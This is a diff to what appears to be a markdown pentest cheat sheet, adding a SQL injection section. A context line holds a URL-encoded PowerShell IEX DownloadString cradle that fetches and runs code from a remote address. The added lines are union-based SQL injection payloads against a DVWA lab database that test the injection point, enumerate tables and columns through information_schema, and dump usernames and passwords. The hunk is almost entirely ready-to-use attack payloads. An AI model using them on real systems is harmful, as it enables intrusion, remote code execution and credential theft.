@@ -243,3 +243,19 @@ IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168
 ```
 
 ## SQL Injection
+
+### test injection point
+
+```sql
+select * from users where username='admin' or 1=1 limit 0,1;#
+```
+
+### union based
+
+```sql
+select * from users where username='admin' or 1=1 order by 3;#
+select * from users where username='admin' union select database(),version(),3;#
+union select table_name,2,3 from information_schema.tables where table_schema=dvwa;#
+union select column_name,2,3 from information_schema.columns where table_name='users';#
+union select username,password,3 from dvwa.users;#
+```
